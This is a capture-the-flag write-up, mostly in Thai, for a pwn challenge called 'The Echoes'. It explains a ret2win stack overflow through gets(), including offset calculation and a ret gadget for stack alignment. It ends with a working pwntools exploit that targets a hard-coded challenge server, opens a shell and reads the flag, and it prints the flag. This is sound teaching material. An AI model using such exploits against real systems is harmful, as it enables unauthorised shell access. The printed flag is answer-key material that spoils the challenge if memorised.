# The Echoes (Pwn, 176pts)

**Flag:** `DELTA{st4ck_sm4shing_1s_fun_2026}`

## โจทย์

Binary มี buffer overflow ผ่าน `gets()` — ต้อง jump ไป `get_shell()` เพื่อได้ shell

## ขั้นตอน

### 1. วิเคราะห์

```bash
file vuln     # ELF 64-bit, EXEC (no PIE)
checksec vuln # No PIE, No canary, NX enabled
```

### 2. Decompile

```c
void vuln() {
  char buf[64];
  gets(buf);              // ⚠️ OVERFLOW!
}

void get_shell() {
  system("/bin/sh");
}
```

### 3. หา Offset

`buf` ที่ `rbp-0x40` (64 bytes)

```
[buf: 64] [saved rbp: 8] [return address: 8]
|___________72 bytes___________|
```

Padding **72 bytes** ก่อนถึง return address

### 4. หา Address

```
get_shell: 0x4011b6
ret:       0x40101a  (stack alignment)
```

### 5. Stack Alignment (movaps)

`system()` ใช้ `movaps` ต้องการ 16-byte alignment เพิ่ม `ret` gadget ก่อน jump:

```
┌──────────────────────┐
│ get_shell (0x4011b6)      │ ← return address
├──────────────────────┤
│ ret (0x40101a)            │ ← stack alignment
├──────────────────────┤
│ padding 72 bytes           │
└──────────────────────┘
```

## Exploit

```python
from pwn import *

r = remote("13.238.150.105", 1338)
r.recvuntil(b"Enter some text:")

get_shell = 0x4011b6
ret = 0x40101a

payload = b"A" * 72
payload += p64(ret)          # stack alignment
payload += p64(get_shell)

r.sendline(payload)
r.sendline(b"cat /flag*")
print(r.recvall(timeout=3).decode())
```

## สรุป

- `gets()` ไม่มี buffer size check
- Buffer overflow → control return address
- ret2win = jump ไปฟังก์ชันที่มี shell
- Stack alignment (movaps) → ต้องเพิ่ม `ret` gadget
